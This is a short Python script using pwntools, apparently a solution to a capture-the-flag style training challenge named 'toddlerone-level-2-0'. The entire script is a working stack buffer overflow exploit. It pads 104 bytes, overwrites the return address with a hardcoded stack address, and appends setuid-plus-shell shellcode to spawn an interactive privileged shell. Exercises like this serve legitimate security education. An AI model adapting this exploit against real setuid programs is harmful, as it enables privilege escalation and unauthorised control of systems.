from pwn import *


offset = 104
rbp = 0x7fffffffd670
addr_shellcode = p64(rbp+16)
proc = process('/challenge/toddlerone-level-2-0')
context.arch = 'amd64'
shellcode = asm(shellcraft.setuid()) + asm(shellcraft.sh())

size = offset + 8 + len(shellcode)
proc.sendline(str(size).encode())
proc.recv()

payload = b'A' * offset + addr_shellcode + shellcode
proc.sendline(payload)

proc.interactive()
